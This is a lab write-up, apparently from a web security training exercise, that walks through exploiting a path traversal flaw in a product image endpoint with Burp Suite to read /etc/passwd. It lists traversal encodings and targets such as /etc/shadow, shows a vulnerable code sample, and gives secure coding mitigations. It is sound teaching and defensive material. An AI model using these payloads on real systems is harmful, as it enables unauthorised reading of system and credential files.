# Path Traversal Vulnerability Lab Report

## Lab Overview

**Vulnerability Type:** Path Traversal (Directory Traversal)  
**Objective:** Retrieve the contents of `/etc/passwd` file  
**Attack Vector:** Product image display functionality  
**Status:** Not Solved

---

## What is Path Traversal?

Path traversal (also known as directory traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server running an application. This can include application code, data, credentials, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior.

---

## Identifying Path Traversal Vulnerabilities

### Step 1: Identify File-Handling Endpoints

Look for functionality that involves file operations, such as:
- Image loading/display (`/images?filename=product.jpg`)
- Document downloads (`/download?file=report.pdf`)
- File uploads with preview features
- Template rendering
- Log file viewing

**In this lab:** The product image display functionality is the vulnerable endpoint.

### Step 2: Analyze Request Parameters

Examine requests that reference files:
- Look for parameters like `filename`, `file`, `path`, `template`, `document`
- Observe the format of file references (relative paths, absolute paths, URLs)
- Check if the application uses predictable file naming conventions

### Step 3: Test for Basic Path Traversal

Attempt to traverse directories using common patterns:

```
../
..\
..;/
%2e%2e%2f (URL encoded ../)
%2e%2e/ (URL encoded ../)
..%2f (URL encoded ../)
%2e%2e%5c (URL encoded ..\)
```

### Step 4: Probe for Different File Paths

Test access to common sensitive files:

**Linux/Unix Systems:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
```

**Windows Systems:**
```
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini
C:\windows\win.ini
```

### Step 5: Vary the Traversal Depth

Try different numbers of directory traversals:
```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
```

The required depth depends on the application's file structure.

---

## Exploiting the Vulnerability: Step-by-Step

### Step 1: Set Up Burp Suite

1. Open Burp Suite
2. Configure your browser to use Burp as a proxy (typically `127.0.0.1:8080`)
3. Navigate to the Burp Proxy tab
4. Ensure "Intercept is on"

### Step 2: Identify the Target Request

1. Browse to a product page in the vulnerable application
2. Observe the product image loading
3. In Burp Suite, locate the HTTP request that fetches the product image
4. The request should look similar to:
   ```
   GET /image?filename=product1.jpg HTTP/1.1
   Host: vulnerable-website.com
   ```

### Step 3: Intercept and Modify the Request

1. Refresh the product page or click on a product image
2. Burp Suite will intercept the request
3. Locate the `filename` parameter in the request
4. Modify the parameter value to include a path traversal sequence

**Original Request:**
```http
GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
Accept: image/webp,*/*
```

**Modified Request:**
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0
Accept: image/webp,*/*
```

### Step 4: Forward the Modified Request

1. After modifying the `filename` parameter, click "Forward" in Burp Suite
2. The modified request will be sent to the server
3. Switch to the "HTTP history" tab or the browser to observe the response

### Step 5: Verify the Exploit

1. Examine the server's response
2. If successful, the response body will contain the contents of `/etc/passwd`
3. The file typically contains entries like:
   ```
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   ...
   ```

---

## Understanding the `/etc/passwd` File

The `/etc/passwd` file is a system file on Unix-like operating systems that contains essential information about user accounts. Each line represents a user account with fields separated by colons:

```
username:password:UID:GID:comment:home_directory:shell
```

**Example:**
```
root:x:0:0:root:/root:/bin/bash
```

- `root`: Username
- `x`: Password placeholder (actual passwords are in `/etc/shadow`)
- `0`: User ID
- `0`: Group ID
- `root`: Comment/description
- `/root`: Home directory
- `/bin/bash`: Default shell

---

## Why This Vulnerability Exists

Path traversal vulnerabilities typically occur when:

1. **Insufficient Input Validation:** The application doesn't properly validate or sanitize file path inputs
2. **Lack of Access Controls:** No checks verify whether the requested file should be accessible
3. **Direct File System Access:** The application directly uses user input to construct file paths
4. **Missing Path Canonicalization:** The application doesn't normalize paths before processing

**Vulnerable Code Example (Conceptual):**
```python
# Vulnerable code
filename = request.GET['filename']
file_path = '/var/www/images/' + filename
return read_file(file_path)
```

When `filename = "../../../etc/passwd"`, the resulting path becomes:
```
/var/www/images/../../../etc/passwd
```

Which resolves to:
```
/etc/passwd
```

---

## Prevention and Mitigation

### 1. Input Validation
- Use allowlists for acceptable filenames
- Reject inputs containing path traversal sequences (`../`, `..\`, etc.)
- Validate file extensions

### 2. Path Canonicalization
- Resolve the full canonical path before accessing files
- Verify the resolved path is within the expected directory

### 3. Use Indirect Object References
- Use IDs or tokens instead of filenames
- Map IDs to actual file paths server-side

### 4. Implement Access Controls
- Check if the user should have access to the requested file
- Use operating system-level permissions

### 5. Chroot Jails or Sandboxing
- Restrict the application's file system access to a specific directory

**Secure Code Example:**
```python
import os

ALLOWED_DIRECTORY = '/var/www/images/'
ALLOWED_EXTENSIONS = ['.jpg', '.png', '.gif']

filename = request.GET['filename']

# Remove any path components
filename = os.path.basename(filename)

# Validate extension
if not any(filename.endswith(ext) for ext in ALLOWED_EXTENSIONS):
    return error("Invalid file type")

# Construct and canonicalize path
file_path = os.path.join(ALLOWED_DIRECTORY, filename)
file_path = os.path.realpath(file_path)

# Verify the resolved path is within allowed directory
if not file_path.startswith(os.path.realpath(ALLOWED_DIRECTORY)):
    return error("Access denied")

return read_file(file_path)
```

---

## Lab Solution Summary

**Payload Used:** `../../../etc/passwd`

**Attack Steps:**
1. Set up Burp Suite as an intercepting proxy
2. Browse to a product page and locate the image request
3. Intercept the request in Burp Suite
4. Modify the `filename` parameter to `../../../etc/passwd`
5. Forward the modified request
6. Observe the `/etc/passwd` file contents in the response

**Result:** Successfully retrieved sensitive system file, demonstrating the path traversal vulnerability.

---

## Key Takeaways

- Path traversal vulnerabilities allow attackers to access files outside the intended directory
- Always validate and sanitize user inputs that interact with the file system
- Use indirect references and proper access controls
- The `/etc/passwd` file is a common target for demonstrating path traversal on Unix systems
- Defense in depth: combine multiple security measures for robust protection

---

## Additional Resources

- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- PortSwigger Web Security Academy: Path Traversal

---

**Report Date:** February 13, 2026  
**Vulnerability Severity:** High  
**CVSS Score:** 7.5 (High) - Information Disclosure